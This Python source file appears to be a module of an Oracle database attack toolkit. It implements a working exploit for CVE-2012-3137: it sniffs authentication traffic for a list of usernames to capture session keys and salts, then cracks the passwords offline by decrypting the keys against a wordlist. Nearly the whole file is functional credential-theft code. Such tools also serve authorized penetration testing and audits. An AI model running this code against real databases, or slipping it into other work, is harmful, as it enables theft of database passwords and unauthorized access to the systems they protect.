#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging, string, re, sys
from Utils import execSystemCmd, checkOptionsGivenByTheUser
from OracleDatabase import OracleDatabase
from time import sleep
import hashlib
from Crypto.Cipher import AES
from threading import Thread
from progressbar import *
from os import geteuid
from Constants import *

#Load scapy without warnings
tempout = sys.stdout; temperr = sys.stderr
sys.stdout = open('/dev/null', 'w'); sys.stderr = open('/dev/null', 'w')
try:
	from scapy.layers.inet import IP
	from scapy import all as scapyall #sniff, IP, Raw
	SCAPY_AVAILABLE = True
except ImportError:
	SCAPY_AVAILABLE = False
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
sys.stdout = tempout; sys.stderr = temperr
if SCAPY_AVAILABLE == False :
	logging.warning('You need to install python scapy if you want to use the CVE_2012_3137 module !')

class CVE_2012_3137 ():
	'''
	CVE-2012-3137 : to get remote passwords thanks to nmap
	'''
	
	sessionKey, salt = "", ""

	def __init__(self, args, accountsFile=None, timeSleep=0):
		'''
		Constructor
		'''
		logging.debug("CVE_2012_3137 object created")
		self.MAX_PACKET_TO_CAPTURE=200
		self.TIMEOUT=5
		self.args=args
		self.accountsFile = accountsFile
		self.timeSleep = timeSleep
		self.usernames = []
		if self.accountsFile != None : self.loadUsernames()
		self.keys = []
		self.passwdFound = []
		self.separator = "|<->|"
	
	def __resetSessionKeyValueAndSalt__(self):
		'''
		'''
		global sessionKey, salt
		sessionKey, salt = "", ""

	def getKeys(self):
		'''
		return keys
		'''
		return self.keys

	def loadUsernames (self,separator = '/'):
		'''
		load usernames from self.accountsFile
		'''
		logging.info ("Loading usernames stored in {0}".format(self.accountsFile))
		f = open(self.accountsFile)
		for l in f:
			nl = l.replace('\n','').replace('\t','').split('/')
			self.usernames.append(nl[0])
		f.close()

	def __sniff_sessionkey_and_salt__(self,ip=None,port=None):
		'''
		To sniff the session key and the salt in an Oracle connection thanks to scapy
		'''
		def customAction(packet):
			global sessionKey, salt
			if packet[0].haslayer(IP)==True and packet[1].src == ip :
				#print packet.show()
				if packet[2].haslayer(scapyall.Raw)==True:
					raw = repr(packet[2].getlayer(scapyall.Raw).load)
					if "AUTH_SESSKEY" in raw and "AUTH_VFR_DATA" in raw:	
						sessionKey = re.findall(r"[0-9a-fA-F]{96}" ,raw[raw.index("AUTH_SESSKEY"):raw.index("AUTH_VFR_DATA")])
						if sessionKey != [] : sessionKey = sessionKey[0]
						try : authVFRindex = raw.index("AUTH_VFR_DATA")
						except : logging.warning("The following string doesn't contain AUTH_VFR_DATA: {0}".format(raw))
						else:
							try: authGloIndex = raw.index("AUTH_GLOBALLY_UNIQUE_DBID")
							except : logging.warning("The following string doesn't contain AUTH_GLOBALLY_UNIQUE_DBID: {0}".format(raw))
							else:
								salt = re.findall(r"[0-9a-fA-F]{22}" ,raw[authVFRindex:authGloIndex])
								if salt != [] : salt = salt[0][2:]
						finally:
							return True
			return False
		self.__resetSessionKeyValueAndSalt__()
		#print "Run with tcp and host {0} and port {1}".format(ip,port)
		scapyall.sniff(filter="tcp and host {0} and port {1}".format(ip,port), count=self.MAX_PACKET_TO_CAPTURE, timeout=self.TIMEOUT, stop_filter=customAction,store=False)
		return sessionKey, salt

	def __try_to_connect__(self,args):
		'''
		'''
		import cx_Oracle
		try:
			cx_Oracle.connect("{0}/{1}@{2}:{3}/{4}".format(self.args['user'],self.args['password'],self.args['server'],self.args['port'],self.args['sid']))
		except Exception, e:
			pass

	def getAPassword(self,user):
		'''
		'''
		logging.debug("Sniffing is running in a new thread")
		a = Thread(None, self.__sniff_sessionkey_and_salt__, None, (), {'ip':self.args['server'],'port':self.args['port']})
		a.start()
		sleep(3)
		logging.debug("Connection to the database via a new thread")
		self.args['user'], self.args['password'] = user, 'a'
		b = Thread(None, self.__try_to_connect__, None, (), {'args':self.args})
		b.start()
		b.join()
		a.join()
		return "",""
		

	def getPasswords(self):
		'''
		get passwords
		'''
		logging.info ("Getting remote passwords of {0} users".format(len(self.usernames)))
		pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=len(self.usernames)).start(), 0
		for user in self.usernames:
			logging.info("Try to get the session key and salt of the {0} user".format(user))
			self.getAPassword(user)
			nb += 1
			pbar.update(nb)
			if sessionKey != '' and salt != '':
				key = "{0}{3}{1}{3}{2}".format(user,sessionKey, salt,self.separator)
				self.keys.append(key)
				logging.debug("Key found: {0}".format(key))
			sleep(self.timeSleep)
		pbar.finish()


	def decryptKeys(self, sessionFile, passwdFile):
		'''
		decrypt keyx
		'''
		def __decryptKey__(session,salt,password):
			pass_hash = hashlib.sha1(password+salt)
			key = pass_hash.digest() + '\x00\x00\x00\x00'
			decryptor = AES.new(key,AES.MODE_CBC,'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
			plain = decryptor.decrypt(session)
			return plain

		#Nb sessions
		fsession, nbsession = open(sessionFile), 0
		for l in fsession: nbsession+=1
		fsession.close()
		logging.info("{0} sessions in the {1} file".format(nbsession,sessionFile))
		#Nb Passwds
		fpasswds, nbpasswds = open(passwdFile), 0
		for l in fpasswds: nbpasswds+=1
		fpasswds.close()
		logging.info("{0} passwords in the {1} file".format(nbpasswds,passwdFile))
		if nbpasswds == 0 : 
			logging.critical("No password in the {0} file".format(passwdFile))
			return []
		elif nbsession == 0:
			logging.critical("No session in the {0} file".format(sessionFile))
			return []
		else :
			fsession = open(sessionFile)
			for session in fsession:
				user, session_hex, salt_hex = session.replace('\n','').replace('\t','').split(self.separator)
				self.args['print'].subtitle("Searching the password of the {0} user".format(user))
				fpasswd = open(passwdFile)
				pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
				for password in fpasswd:
					nb +=1
					pbar.update(nb)
					password = password.replace('\n','').replace('\t','')
					session_id = __decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
					if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
						self.passwdFound.append([user,password])
						self.args['print'].goodNews("{0} password:{1}".format(user,password))
						fpasswd.close()
						break
				fpasswd.close()
				pbar.finish()
			fsession.close()
			return self.passwdFound

	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("CVE-2012-3137 library ?")
		self.args['print'].unknownNews("I can't know if it is vulnerable")


def runCVE20123137Module(args):
	'''
	Run the CVE_2012_3137 module
	'''
	if checkOptionsGivenByTheUser(args,["test-module","get-all-passwords","decrypt-sessions"],checkAccount=False) == False : return EXIT_MISS_ARGUMENT
	cve = CVE_2012_3137 (args,  accountsFile=args['user-list'], timeSleep=args['timeSleep'])
	if args['test-module'] == True :
		cve.testAll()
	#Option 1: get all passwords
	if args['get-all-passwords'] != None:
		print 
		if geteuid() != 0:
			args['print'].badNews("Sorry, you need to run this as root because I need to sniff authentications to the database")
		else:
			args['print'].title("Getting remote passwords on the {0} server, port {1}".format(args['server'],args['port']))
			cve.getPasswords()
			keys = cve.getKeys()
			if keys != []:
				args['print'].goodNews("Here are keys:\n\n{0}".format('\n'.join(keys)))
				filename = "sessions-{0}-{1}-{2}{3}".format(args['server'],args['port'],args['sid'],CHALLENGE_EXT_FILE)
				f = open(filename,"w")
				f.write('\n'.join(keys))
				f.close()
				args['print'].goodNews("Sessions strored in the {0} file.".format(filename))
			else : 
				args['print'].badNews("Impossible to exploit this vulnreability")
	#Option 2: decrypt sessions
	if args['decrypt-sessions'] != None:
		args['print'].title("Decrypt sessions stored in {0} via {1}".format(args['decrypt-sessions'][0],args['decrypt-sessions'][1]))
		passwds = cve.decryptKeys(args['decrypt-sessions'][0], args['decrypt-sessions'][1])
		if passwds != []:
			passwordsStr = ""
			for e in passwds : 
				passwordsStr +='{0}:{1}\n'.format(e[0],e[1])
			args['print'].goodNews("Accounts found:\n{0}".format(passwordsStr))
		else:
			args['print'].badNews("No password has been found")





